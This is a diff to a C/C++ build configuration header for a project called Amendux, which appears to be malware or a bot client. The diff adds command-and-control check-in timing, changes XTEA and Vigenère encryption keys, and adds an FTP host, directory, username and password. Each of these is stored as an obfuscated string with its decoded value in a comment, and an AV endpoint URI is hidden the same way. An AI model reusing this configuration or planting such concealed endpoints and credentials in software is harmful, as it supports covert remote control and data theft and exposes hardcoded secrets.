@@ -8,9 +8,6 @@
 //   >> DO NOT CHANGE THE CONTENTS OF THIS FILE, USE THE BUILDER INSTEAD <<
 //
 
-#define variantCount() (sizeof(variantDisplayName) / sizeof(variantDisplayName[0]))
-#define staticVariant() -1
-
 // INSDEF
 #define EXE_NANME ""
 #define INSTANCEID ""
@@ -21,9 +18,13 @@
 
 // ENCDEF
 #define VIGE_KEY		"JiD2OSA9Z0cmNxQ2zcPS"
-#define XTEA_KEY		"qefzd6C8Cr8LSidC6mpo"
+#define XTEA_KEY		"JUlO.Phw5A+-aCfv"
 
-#define VARIANT_INVALID	1000
+// CCDEF
+#define CHECKIN_PACE	15
+#define SOLICIT_PACE	1
+
+#define VARIANT_INVALID	1000//move
 
 // AVCDEF
 #if DEBUG
@@ -36,11 +37,20 @@
 #define AVC_URI			"nip*raqcbvag^cuc" // avc_endpoint.php
 #endif
 
+// FTPDEF
+#define FTP_HOST		"0k17^arg23^arg:21" // 0x17.net23.net:21
+#define FTP_DIR			"?ine" // /var
+#define FTP_USER		"n6289090" // a6289090
+#define FTP_PASS		"dnoDeidHrGi1fr4TzpkT" // qabQrvqUeTv1se4GmcxG
+
 // BUILDDEF
 #define ISBUILD 1
 
 // BOOTDEF
 // #define SECURE_DOUBLE_BOOT	1
+
+#define variantCount() (sizeof(variantDisplayName) / sizeof(variantDisplayName[0]))
+#define staticVariant() -1
 
 namespace Amendux {
 
